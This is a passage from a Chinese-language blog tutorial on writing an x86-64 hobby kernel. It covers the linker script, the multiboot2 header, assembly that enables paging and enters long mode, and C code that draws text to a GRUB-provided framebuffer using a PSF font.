class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ld">OUTPUT_FORMAT(&quot;elf64-x86-64&quot;)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    /* boot loader will load the kernel there */<br>    . = 1M;<br>__boot_start = .;<br><br>/* ASM boot-state kernel */<br><br>    .boot.loader :<br>&#123;<br>KEEP(*(.boot.header))<br>*(.boot.*)<br>arch/x86/boot/libBoot.a<br>&#125;<br><br>. = ALIGN(4096);<br><br>/* C boot-state kernel */<br><br>.boot.text ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.boot.rodata ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.boot.data ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.data)<br>arch/x86/boot/libBoot.a(.*)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__boot_end = .;<br><br>/* now we come to the REAL kernel */<br><br>KERM_VADDR = 0xffffffff81000000;<br>. = KERM_VADDR;<br><br>/* we use AT() there to make it loaded on phys correctly */<br>.text ALIGN(4096) : AT (ADDR (.text) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.rodata ALIGN(4096) : AT (ADDR (.rodata) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__roseg_end = .;<br><br>.data ALIGN(4096) : AT (ADDR (.data) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.data)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.bss ALIGN(4096) : AT (ADDR (.bss) - KERM_VADDR + __boot_end)<br>&#123;<br>*(COMMON)<br>*(.bss)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="boot-S：BIOS-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言"><a href="#boot-S：BIOS-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言" class="headerlink" title="boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言"></a>boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言</h2><p><code>arch/x86/boot.S</code> 中则是我们实际的内核入口点，因为对于实现 multiboot 规范的内核而言 <strong>没必要在汇编下进行绝大部分系统功能的实现</strong> ，所以这个文件的核心功能就 <strong>仅是完成部分必须的准备工作并快速进入 C 语言部分</strong></p><p>我们的 multiboot2 header 也可以放在这个地方，这里除了最基本的结构以外笔者还引入了一个指示入口点的 tag，以及一个指示让 GRUB 帮我们设置好指定大小的 frame buffer 的 tag，GRUB2 会根据这个 tag 自动帮我们设置显示模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#define ASM_FILE 1<br>#include &lt;boot/multiboot2.h&gt;<br>#include &lt;asm/cpu_types.h&gt;<br>#include &lt;asm/page_types.h&gt;<br><br>#define GRUB_MULTIBOOT_ARCHITECTURE_I386 (0)<br>#define MULTIBOOT2_HEADER_LEN (multiboot_header_end - multiboot_header)<br>#define MULTIBOOT2_HEADER_CHECKSUM \<br>    -(MULTIBOOT2_HEADER_MAGIC \<br>    + GRUB_MULTIBOOT_ARCHITECTURE_I386 \<br>    + MULTIBOOT2_HEADER_LEN)<br><br>.section .boot.loader.header<br>    .align 8<br><br>    multiboot_header:<br>        .long   MULTIBOOT2_HEADER_MAGIC<br>        .long   GRUB_MULTIBOOT_ARCHITECTURE_I386<br>        .long   MULTIBOOT2_HEADER_LEN<br>        .long   MULTIBOOT2_HEADER_CHECKSUM<br><br>    tag_entry:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_ENTRY_ADDRESS<br>        .short 0<br>        .long 12<br>        .long _start<br>    <br>    tag_frame_buffer:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_FRAMEBUFFER<br>        .short 0<br>        .long 20<br>        .long 1024<br>        .long 768<br>        .long 32<br><br>    tags_end:<br>        .align 8<br>        .short  MULTIBOOT_HEADER_TAG_END<br>        .short  0<br>        .long   8<br>    multiboot_header_end:<br></code></pre></td></tr></table></figure><p>ELF 文件默认的入口点是 <code>_start</code> 函数，因此我们在这里声明一个 <code>_start</code> 函数并导出该符号，从而使得 GRUB 在完成内核的装载之后会从此处开始执行，不过我们也可以通过在 header 中添加一个 <code>entry address tag</code> 来为 GRUB 指定我们的内核入口点：</p><p>不过在正式开始之前，我们首先看看当前的机器状态，这里笔者打算<strong>同时兼容 Legacy BIOS 启动与 UEFI 启动</strong>，因此这两种机器状态我们都得看看如何处理</p><h3 id="①-Legacy-BIOS-启动"><a href="#①-Legacy-BIOS-启动" class="headerlink" title="① Legacy BIOS 启动"></a>① Legacy BIOS 启动</h3><p>当我们使用 Legay BIOS 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址（参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">这里</a>）</li><li><code>cs</code>：权限为 <code>读|执行</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>ds、es、fs、gs、ss</code>：权限为 <code>读|写</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>A20 gate</code>：已开启</li><li><code>cr0</code>：分页（PG）关闭，保护模式（PE）开启</li><li><code>eflags</code>：VM、IF 两个位清空</li></ul><p>剩下的工作都需要我们的内核自行完成，包括段描述符表的设置、堆栈、中断描述符表的设置等</p><h3 id="②-UEFI-启动"><a href="#②-UEFI-启动" class="headerlink" title="② UEFI 启动"></a>② UEFI 启动</h3><p>当我们使用 UEFI 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址</li></ul><p>根据 <a href="https://uefi.org/sites/default/files/resources/UEFI%20Spec%202_6.pdf">UEFI 规范 v2.6</a> 第 2.3.2 节，此时机器有如下状态：</p><ul><li>单处理器模式（Uniprocessor，仅有一个核心被唤醒，参见 <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 卷 3）</li><li>处在保护模式下</li><li><strong>可能</strong>开启了分页，若是，则 UEFI 内存映射定义的任何内存空间都是恒等映射的（虚拟地址等于物理地址），对其他区域的映射是未定义的，可能因实现而异</li><li>选择子（selector）设为“平坦模式”（flat model）或未使用</li><li>中断开启，不过仅支持 UEFI 引导服务计时器（所有加载的设备驱动都通过“轮询”进行同步服务）</li><li>EFLAGS 中的方向标志位被清除</li><li>其他通用标志寄存器未定义</li><li>128 KB 或更多的可用栈空间</li><li>栈为 16 字节对齐，可能在页表中被标记为不可执行</li><li><code>floating-point control word</code> 被初始化为 <code>0x027F</code>（all exceptions masked, double-extended-precision, round-to-nearest）</li><li><code>Multimedia-extensions control word</code> 被初始化为 <code>0x1F80</code> (all exceptions masked, roundto-nearest, flush to zero for masked underflow)</li><li><code>CR0.EM == 0</code></li><li><code>CR0.TS == 0</code></li></ul><blockquote><p>选择子的平坦模式示意如下：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115220200.png"></p></blockquote><h3 id="③-初始化栈与临时页表"><a href="#③-初始化栈与临时页表" class="headerlink" title="③ 初始化栈与临时页表"></a>③ 初始化栈与临时页表</h3><p>我们不难看出 BIOS 启动与 UEFI 启动后的机器状态在 32 位下差别并不大，大家都在保护模式下，只是 UEFI 启动<strong>可能</strong>会额外多一个栈和页表的配置，不过我们完全可以 <em>抛弃 UEFI 帮我们预设好的页表与栈，自己从头开始初始化一个</em></p><p>首先是页表的初始化，由于现在尚未完成内存管理器的构建，因此笔者选择仅构建一个临时的页表，待到进入 64 位长模式完成内存探测与内存分配器的建立之后再重新建立一个正式的新页表，64 位模式下所用的通常是四级页表，虚拟地址有效长度为 48 位，在控制寄存器组（control registers）中的 CR3 寄存器中存放顶层页表的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115214456.png"></p><blockquote><p>页表所使用的模式由 CR4 寄存器决定，具体可以参见 Intel SDM 的 3102 页 4.1.1 Four Paging Modes</p></blockquote><p>不过启动阶段若是我们的临时页表也采用 4 级页表的结构的话，或许会需要占用过多的内存空间来保证对所有内存的映射，因为这个页表只是在内存管理器建立起来之前临时一用，因此这里我们使用 <strong>1GB 的大页</strong>，这样只需要两张页面组成的二级页表便能撑起我们初期所需的所有的内存空间，<strong>待到完成最基本的内存管理器的初始化之后再重新进行页表的动态初始化</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127203951.png"></p><p>1 GB 大页的开启需要我们进入 64 位，并在页表项中设置 <code>PS</code> 位，此外，进入 64 位模式要求我们启用<strong>物理地址扩展</strong>（Physical Address Extension），这项特性将页表项从 4 字节扩展为 8 字节，我们需要在进入 64 位之前通过设置 CR4 寄存器的 PAE 位来启用该特性，并在提前在预先准备好的二级页表中设置 <code>PS</code> 位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section .boot.loader.text32:<br>    .code32<br>    .align 0x1000<br>    .extern boot_main<br><br>    .globl _start<br><br>    _start:<br>        # turn off the interrupt temporarily,<br>        # and we should turn it on after our own IDT has been built.<br>        cli<br><br>        # check for multiboot2 header<br>        cmp $MULTIBOOT2_BOOTLOADER_MAGIC, %eax<br>        jne .loop<br><br>        # temporary stack<br>        mov     $boot_stack_top, %esp<br><br>        # set the boot information as parameters for boot_main()<br>        mov     %eax, %edi<br>        mov     %ebx, %esi<br><br>        # clear eflags<br>        pushl   $0<br>        popf<br><br>        # disable paging (UEFI may turn it on)<br>        mov     %cr0, %eax<br>        mov     $CR0_PG, %ebx<br>        not     %ebx<br>        and     %ebx, %eax<br>        mov     %eax, %cr0<br><br>        # set up page table for booting stage<br>        # it&#x27;s okay to write only 32bit here :)<br>        mov     $boot_pud, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW), %eax<br>        mov     %eax, boot_pgd<br><br>        xor     %eax, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW | PAGE_ATTR_PS), %eax<br>        movl    %eax, boot_pud<br><br>        xor     %eax, %eax<br>        mov     %eax, (boot_pgd + 4)<br>        mov     %eax, (boot_pud + 4)<br><br>        # load page table<br>        mov     $boot_pgd, %eax<br>        mov     %eax, %cr3<br><br>#......<br><br>.section .boot.loader.data<br>    .align 0x1000<br><br>    .globl boot_stack, boot_stack_top<br><br>    #<br>    # When the system is booted under legacy BIOS, there&#x27;s no stack<br>    # So we reserve a page there as a temporary stack for booting<br>    #<br>    boot_stack:<br>        .space 0x1000<br>    boot_stack_top:<br><br>    boot_pgd:<br>        .space 0x1000<br>    boot_pud:<br>        .space 0x1000<br><br></code></pre></td></tr></table></figure><h3 id="④-进入-64-位模式"><a href="#④-进入-64-位模式" class="headerlink" title="④ 进入 64 位模式"></a>④ 进入 64 位模式</h3><p>64 位运行模式（Intel 称为 <code>IA-32e mode</code>，AMD 称为 <code>long mode</code>）是进入 64 位时代后 x64 处理器引入的<strong>新的运行模式</strong>，其有着两个子模式：</p><ul><li>兼容模式（Compatibility mode）：传统的 16&#x2F;32 位应用程序仍能正常运行，类似于 32 位保护模式，其使用 16&#x2F;32 位地址与操作数，仅能访问线性地址空间的前 4 GB，通过 PAE 可以访问更多的物理内存</li><li>纯 64 位模式（64-bit mode）：该模式下可以访问 64 位线性地址空间， <em>通常</em> 不再使用分段，通用寄存器与 SIMD 扩展寄存器从 8 个扩展至 16 个，通用寄存器扩展至 64 位，默认地址大小为 64 位，默认操作数大小为 32 位，新增的 opcode 前缀 <code>REX</code> 用以进行 64 位下的扩展访问</li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png"></p><blockquote><p>参见 Intel SDM 卷 1 Chapter 3、卷 3A Chapter 2 与 AMD64 PM 卷 1 Chapter 2、卷 2 Chapter 1</p><blockquote><p><del>翻大砖头全英手册真给👴整麻了</del></p></blockquote></blockquote><p>简而言之就是进入 64 位模式之后正常运行 64 位应用就在纯 64 位模式，但也可以通过兼容模式来像 32 位保护模式那样运行以前的 32 位应用，这两种子模式间的切换<strong>通过 CS 段选择子对应的段描述符的 L 位决定</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129171602.png" alt="AMD64 处理器运行模式切换"></p><p>我们的 64 位操作系统自然是运行在纯 64 位这一子模式下的，而 GRUB 引导进入我们的内核时我们仍处于 32 位模式下，因此我们需要编写 32 位汇编来将处理器切换到 64 位模式，具体需要进行如下工作：</p><ul><li>将 **Model Specific Register **这一寄存器组中的 <strong>Extended Feature Enable Register</strong> 寄存器的 LME 位置为 1（参见 Intel SDM 卷 3 A Chapter 2 的 2.2.1 节，Table 2-1）</li><li>配置好相应的全局段描述符表，并将 CS 段选择子对应的段描述符的 L 位置为 1</li><li>开启控制寄存器组中 CR4 寄存器的 <strong>物理地址扩展</strong>（Physical Address Extension）</li><li>开启控制寄存器组中 CR0 寄存器的 <strong>分页</strong>（Paging），这要求我们预先装载一份页表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">        # enable PAE and PGE<br>        mov     %cr4, %eax<br>        or      $(CR4_PAE | CR4_PGE), %eax<br>        mov     %eax, %cr4<br><br>        # enter long mode by enabling EFER.LME<br>        mov     $0xC0000080, %ecx<br>        rdmsr<br>        or      $(1 &lt;&lt; 8), %eax<br>        wrmsr<br><br>        # enable paging<br>        mov     %cr0, %eax<br>        or      $CR0_PG, %eax<br>        mov     %eax, %cr0<br><br>        # set up GDT<br>        mov     $gdt64_ptr, %eax<br>        lgdt    0(%eax)<br><br>#......<br><br>.section .boot.loader.data<br>    #......<br><br>    # global segment descriptor table<br>    .align 0x1000   # it should be aligned to page<br>    .globl gdt64, gdt64_ptr<br>    gdt64:<br>        .quad 0 # first one must be zero<br>    gdt64_code_segment:<br>        .quad 0x00209A0000000000 # exec/read<br>    gdt64_data_segment:<br>        .quad 0x0000920000000000 # read/write<br>    gdt64_ptr:<br>        .short gdt64_ptr - gdt64 - 1    # GDT limit<br>        .long gdt64                     # GDT Addr<br></code></pre></td></tr></table></figure><p>此时我们便来到了 64 位<strong>兼容模式</strong>，而要进入纯 64 位模式，则需要我们<strong>手动更新 CS 段选择子</strong>，这里笔者通过一个远跳转 <code>jmp</code> 指令<strong>手动指定段选择子的方式来刷新 CS 段选择子</strong></p><blockquote><p>以及别忘了刷新数据段选择子和其他段选择子，这些选择子可以直接通过寄存器进行重新赋值，<strong>但是 CS 段选择子必须通过指令进行刷新</strong></p></blockquote><p>从 <code>boot_main()</code> 开始我们就可以进入 C 语言的世界了：）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    # reload all the segment registers<br>    mov $(2 &lt;&lt; SELECTOR_INDEX), %ax<br>    mov     %ax, %ds<br>    mov     %ax, %ss<br>    mov     %ax, %es<br>    mov     %ax, %fs<br>    mov     %ax, %gs<br><br>    # enter the 64-bit world within a long jmp<br>    jmp $(1 &lt;&lt; SELECTOR_INDEX), $boot_main<br><br>    # we shouldn&#x27;t get here...<br>.loop:<br>    hlt<br>    jmp .loop<br></code></pre></td></tr></table></figure><blockquote><p>注：除了通过 <code>jmp 选择子:目标地址</code> 的方式以外，我们也可以通过 <code>lretq</code> 指令刷新 CS 段选择子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>  pushq   $(1 &lt;&lt; SELECTOR_INDEX)<br>  pushq   $boot_main<br>  lretq<br></code></pre></td></tr></table></figure></blockquote><blockquote><h4 id="Extra-分段内存简介"><a href="#Extra-分段内存简介" class="headerlink" title="Extra. 分段内存简介"></a>Extra. 分段内存简介</h4><p>在古老的 16 位与 32 位运行模式下，x86 有一种管理内存的办法叫做<strong>分段</strong>（Segment），一个段便是一段连续内存，相应地有 cs、ds 等段寄存器用来指示不同用途的段，经过分段映射的地址称为逻辑地址（logical address）</p><p>16 位下段寄存器中直接存放段基址与段界限信息，32 位下段描述符扩展为 8 字节，存放在内存中一个名为段描述符表的结构中，GDTR 寄存器用来存放全局段描述符表的地址，相应地段寄存器中存放的变为段选择子（segment selector），指示了该段寄存器对应的段在段描述符表中的索引、权限等信息</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129183708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184644.png" alt="32 位下的段描述符"></p><p>不过分段内存模式过于鸡肋，现代操作系统通常会选择把所有段都初始化为整个内存，因此 CPU 厂商更改了设计，在 64 位下默认不使用分段特性，不过 <em>也不是完全弃用分段这一特性</em> （尾大不掉属于是）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184734.png" alt="64 位下的段描述符"></p></blockquote><h2 id="boot-tty-c：读写-frame-buffer-进行文字输出"><a href="#boot-tty-c：读写-frame-buffer-进行文字输出" class="headerlink" title="boot_tty.c：读写 frame buffer 进行文字输出"></a>boot_tty.c：读写 frame buffer 进行文字输出</h2><p>熟悉各类操作系统开发教程的小伙伴肯定知道非常经典的读写 <code>0xB8000</code> 这块内存便能在屏幕上进行字体输出， <strong>但是在 UEFI 启动下这个方法已经不在可用</strong> ，那么我们该怎么进行字体输出呢？最简单的办法自然是——<strong>把像素点直接画在屏幕上</strong></p><h3 id="①-Frame-Buffer"><a href="#①-Frame-Buffer" class="headerlink" title="① Frame Buffer"></a>① Frame Buffer</h3><p><strong>帧缓冲区</strong> （ <strong>frame buffer</strong> ）为内存&#x2F;显存中的一块自定义区域，可以简单理解为屏幕上所显示内容的缓存，显卡会定期从这块区域搬运数据到显示设备上，因此我们可以通过读写 frame buffer 的方式来在显示器的指定位置显示指定的像素点</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129185224.png"></p><p>有了 Multiboot2 规范，我们可以指示 GRUB2 帮我们准备 Frame buffer 的相关信息并传递给我们的内核，接下来我们便能通过直接读写 frame buffer 对应内存的方式来直接在屏幕上进行显示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* frame buffer info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> *framebuffer_base; <span class="hljs-comment">/* 32 bit color */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_width;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_height;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_clear_screen_internal_fb</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; framebuffer_height; y++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>            framebuffer_base[y * framebuffer_width + x] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">boot_get_frame_buffer</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_framebuffer</span> *<span class="hljs-title">fb_info</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag</span> *<span class="hljs-title">tag</span> =</span> (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* find framebuffer tag */</span><br>    <span class="hljs-keyword">if</span> (tag == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (tag-&gt;type != MULTIBOOT_TAG_TYPE_END) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_FRAMEBUFFER) &#123;<br>            fb_info = (<span class="hljs-keyword">struct</span> multiboot_tag_framebuffer*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) \<br>              ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fb_info == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    framebuffer_base = (<span class="hljs-type">uint32_t</span>*) fb_info-&gt;common.framebuffer_addr;<br>    framebuffer_height = fb_info-&gt;common.framebuffer_height;<br>    framebuffer_width = fb_info-&gt;common.framebuffer_width;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-字体解析绘制"><a href="#②-字体解析绘制" class="headerlink" title="② 字体解析绘制"></a>② 字体解析绘制</h3><p>虽然我们现在可以通过直接操作 Frame buffer 来绘制图形，但是每个字体都要从零开始绘制的话未免就太麻烦了一点，因此我们选择载入现有的 <strong>PC Screen Font</strong> 格式的字体文件，从中读取相应的字体信息进行绘制</p><blockquote><p>这里字体笔者选择了 <a href="https://github.com/talamus/solarize-12x29-psf/">solarize-12x29</a>，clone 到本地后将 <code>Solarize.12x29.psf</code> 拷贝为 <code>arch/x86/boot/font.psf</code> 即可</p></blockquote><p>由于我们还没建立文件系统，因此我们需要将字体文件直接链接到内核当中，这里可以使用 <code>objcopy</code> 这一工具来将字体文件转换为可链接文件：</p><blockquote><p>需要注意的是，<strong>objcopy 会非常 sb 地把路径名也放进去</strong>，因此比较可行的解决方案就是<strong>提前将字体文件转换为 .o 文件</strong></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objcopy -O elf64-x86-64 -B i386 -I binary font.psf boot_font.o</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -t boot_font.o</span><br><br>boot_font.o:     file format elf64-x86-64<br><br>SYMBOL TABLE:<br>0000000000000000 g       .data  0000000000000000 _binary_font_psf_start<br>0000000000007420 g       .data  0000000000000000 _binary_font_psf_end<br>0000000000007420 g       *ABS*  0000000000000000 _binary_font_psf_size<br></code></pre></td></tr></table></figure><p>现在我们来看如何解析这一格式的字体，PSF 有两版规范，由一个 header 来指示字体基本信息， header 之后便是字体的位图信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PSF1_FONT_MAGIC 0x0436</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> 